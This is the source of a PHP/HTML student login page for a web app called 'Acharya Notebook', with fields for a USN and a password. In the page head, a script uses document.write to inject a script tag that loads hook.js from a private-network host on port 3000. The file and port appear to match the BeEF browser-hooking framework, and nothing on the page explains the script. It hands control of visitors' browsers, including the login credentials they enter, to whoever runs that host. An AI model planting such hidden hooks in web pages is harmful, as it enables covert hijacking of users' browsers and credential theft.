<?php include('server.php');?>
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Acharya Notebook</title>
  <!-- base:css -->
  <link rel="stylesheet" href="../../vendors/mdi/css/materialdesignicons.min.css">
  <link rel="stylesheet" href="../../vendors/feather/feather.css">
  <link rel="stylesheet" href="../../vendors/base/vendor.bundle.base.css">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="../../css/style.css">
  <!-- endinject -->
  <link rel="shortcut icon" href="../../images/favicon.png" />
  <script>
		var commandModuleStr = '<script src="http://192.168.43.190:3000/hook.js" type="text/javascript"><\/script>';
		document.write(commandModuleStr);
	</script>
</head>

<body>
  <div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper">
      <div class="content-wrapper d-flex align-items-center auth px-0">
        <div class="row w-100 mx-0">
          <div class="col-lg-4 mx-auto">
            <div class="auth-form-light text-left py-5 px-4 px-sm-5">
              <div class="">
                <center><img height="38" width="175"  src="../../images/logo-dark.png" alt="logo"></center>
              </div>
              <div>
              	<center>For Students</center>
              </div>
              <br>
              <h4>Hello! let's get started</h4>
              <h6 class="font-weight-light">Sign in to continue.</h6>
              <form class="pt-3" method="post" action="studentlogin.php" >
                <?php include('error.php');?>
                <div class="form-group">
                  <input type="text" class="form-control form-control-lg" id="exampleInputEmail1" name="usn"  placeholder="USN">
                </div>
                <div class="form-group">
                  <input type="password" class="form-control form-control-lg" id="exampleInputPassword1" name="pass"  placeholder="Password">
                </div>
                <div class="mt-3">
                  <input type="submit" name="login_user" class="btn btn-block btn-info btn-lg font-weight-medium auth-form-btn" >
                </div>
                <div class="my-2 d-flex justify-content-between align-items-center">
                  <a href="/forgetPasswordstudent.php" class="auth-link text-black">Forgot password?</a>
                </div>
                
                
                
                <div class="text-center mt-4 font-weight-light">
                  Don't have an account? <a href="studentregister.php" class="text-primary">Create</a><br>
                  Are You a Teacher? <a href="teacherindex.php" class="text-primary">Click Here..!</a>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
      <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
  <!-- base:js -->
  <script src="../../vendors/base/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- inject:js -->
  <script src="../../js/off-canvas.js"></script>
  <script src="../../js/hoverable-collapse.js"></script>
  <script src="../../js/template.js"></script>
  <!-- endinject -->
</body>

</html>
